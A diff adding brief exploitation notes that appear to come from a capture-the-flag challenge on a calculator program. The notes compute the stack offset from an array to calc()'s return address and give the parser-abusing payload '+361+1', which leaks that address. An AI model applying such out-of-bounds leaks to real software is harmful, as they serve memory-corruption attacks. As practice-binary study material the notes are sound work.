@@ -1,0 +1,12 @@
+pool[0] is at 0xffffcd28
+calc()'s return addr is at 0xffffd2cc
+
+0xffffd2cc - 0xffffcd28 = 1444
+1444 / 4 = 361
+so the return addr == pool[361]
+
+---
+leaking memory content at pool[361]
+payload: +361+1
+and then it will print something like 134517914
+134517914 - 1 = 134517913 = 0x8049499
